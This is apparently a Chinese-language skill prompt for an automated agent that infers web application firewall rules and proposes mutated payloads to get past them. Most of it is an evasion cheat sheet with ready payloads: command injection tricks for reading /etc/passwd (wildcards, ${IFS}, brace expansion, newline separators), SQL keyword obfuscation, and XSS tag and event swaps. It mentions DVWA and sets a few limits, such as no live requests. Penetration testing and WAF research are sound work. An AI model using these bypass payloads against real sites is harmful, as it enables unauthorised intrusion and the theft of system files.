# 过滤规则逆向 Skill（生产级）

## 核心任务

不进行实际测试，仅基于 Payload 结构和 `available_directions` **推理** WAF 可能的过滤规则，将推理转化为部件级变异建议。

## WAF 常见过滤模式与绕过策略

### 模式 1：命令黑名单（关键字过滤）

**典型检测**：WAF 匹配 `cat`、`whoami`、`ls` 等命令名。

**识别信号**：
- 基础 Payload 使用了非常见命令（如 `nl` 而不是 `cat`）
- 祖先 Payload 尝试了多个常见命令但都被拦截

**绕过策略**：
1. 命令等价替换：`cat → head`, `cat → nl`, `cat → more`
2. 变量间接引用：`cat → c=cat;$c`
3. 通配符路径：`cat → /bin/c?t`, `cat → /bin/[c]at`
4. 花括号展开：`cat → {c,h}at`
5. 子 Shell 包装：`cat → $(echo cat)`

### 模式 2：分隔符过滤

**典型检测**：WAF 匹配 `;`、`&&`、`|` 等命令分隔符。

**识别信号**：
- 基础 Payload 使用了不常见的分隔符
- DVWA Medium 过滤 `;` 和 `&&`，High 还过滤 `|`

**绕过策略**：
1. 换行符：`;` → `%0a` → `\n`（PHP escapeshellcmd 盲区）
2. 命令替换：`;id` → `$(id)` → `` `id` ``
3. 逻辑运算符：`;` → `||` → `&&`（如果未被过滤）
4. 管道：`;cmd` → `|cmd`
5. 后台执行（慎用）：`;` → `&`
6. 无分隔符（同义命令合并）：`;ls` → `ls` 改成 `echo *`

### 模式 3：空格过滤

**典型检测**：WAF 匹配空白字符。

**识别信号**：
- 基础 Payload 使用了 `${IFS}` 或 `%09` 替代空格

**绕过策略**：
1. IFS 变量：` ` → `${IFS}` → `$IFS` → `${IFS%??}`
2. 制表符：` ` → `%09`（水平制表符）
3. 花括号：`cat /etc/passwd` → `{cat,/etc/passwd}`
4. 括号：`cat /etc/passwd` → `$(cat</etc/passwd)`
5. 输入重定向：`cat /etc/passwd` → `cat</etc/passwd`
6. 换行符：` ` → `\n`

### 模式 4：路径关键字过滤

**典型检测**：WAF 匹配 `/etc/passwd`、`/etc/shadow` 等敏感路径。

**识别信号**：
- 基础 Payload 使用了路径变换技巧
- 只检测完整路径字符串

**绕过策略**：
1. 通配符：`/etc/passwd` → `/etc/pass?d` → `/etc/p*`
2. 字符类：`/etc/passwd` → `/etc/[p]asswd` → `/etc/[pP]asswd`
3. 路径遍历混淆：`/etc/passwd` → `/etc/./passwd` → `/etc/../etc/passwd`
4. 变量拼接：`/etc/passwd` → `/e${x}tc/passwd`（$x 为空）
5. 多级通配：`/etc/passwd` → `/???/??????`
6. 连接符：`/etc/passwd` → `/etc/` 和 `passwd` 分开传递（如果上下文允许）

### 模式 5：SQL 关键字过滤

**典型检测**：WAF 匹配 `SELECT`、`UNION`、`OR` 等 SQL 关键字。

**识别信号**：
- SQL 注入 Payload 被拦截但未触发应用错误
- 基础 Payload 使用了大小写或注释混淆

**绕过策略**：
1. 大小写：`SELECT` → `SeLeCt` → `selEcT`
2. 注释插入：`SELECT` → `SE/**/LECT` → `SEL/*!50000*/ECT`
3. 运算符替换：`OR` → `||`，`AND` → `&&`
4. 函数名混淆：`SELECT` → `` (使用子查询或 JOIN)
5. 重复关键字：`SELSELECTECT`（某些 WAF 只过滤一次）

### 模式 6：XSS 标签/事件过滤

**典型检测**：WAF 匹配 `<script`、`onerror`、`alert` 等。

**识别信号**：
- XSS Payload 使用了非常见标签或事件
- 基础 Payload 已使用了混淆技巧

**绕过策略**：
1. 标签替换：`<script>` → `<img>` → `<svg>` → `<details>`
2. 事件替换：`onerror` → `onload` → `ontoggle` → `onfocus`
3. 函数替换：`alert` → `prompt` → `confirm` → `eval('alert(1)')`
4. 大小写混淆：`<ScRiPt>` → `<SCRIPT>`
5. 属性分割：`onerror` → `onerror   =`（多余空格）
6. 无空格属性：`<img src=x onerror=alert(1)>` → `<img src=x/onerror=alert(1)>`

### 模式 7：正则锚定绕过

**典型检测**：WAF 使用正则表达式，但未使用 `^...$` 锚定。

**识别信号**：
- Payload 前加合法数据可以通过
- Payload 的某些部分被检测但整个请求未被拦截

**绕过策略**：
1. 合法前缀追加：在注入点前添加正常参数值
2. 合法后缀追加：`;id` → `;id # 这是注释`（添加注释淡化有害部分）
3. 超长填充：注入点前填充大量无害数据使 WAF 截断

## 推理流程

1. **审视 base_parts**：基础 Payload 用了哪些技术？哪些部件是"非标准"的？
2. **审视 used_direction_ids**：祖先尝试了哪些方向？可能哪些被拦截了？
3. **审视 available_directions**：还有哪些方向未尝试？按优先级排序。
4. **提出假设**：如果某方向被拦截，尝试同类中的另一种技术。
5. **避免兜圈**：检查 `ancestor_content_fingerprints`，不要生成与祖先相同的 Payload。

## 优先级排序

按绕过效果从高到低：
1. **深层技术优先**：变量间接引用 > 花括号展开 > 通配符 > 同义替换
2. **组合技术优先**：每条候选组合 2+ 种技术（如分隔符替换 + 变量间接引用）
3. **Shell 特性优先**：利用 bash-ism（`<<<`、`$'...'`、`{a,b}`）> POSIX 标准语法
4. **未探索方向优先**：available_directions 中未被祖先使用的方向

## 禁止

- 不进行实际 HTTP 请求或 WAF 测试
- 不使用编码/转义/解码器
- 不自由拼接完整 Payload（必须通过 part_operations）
- 不推荐将验证目标从低影响切换为高影响（如 whoami → cat /etc/shadow）
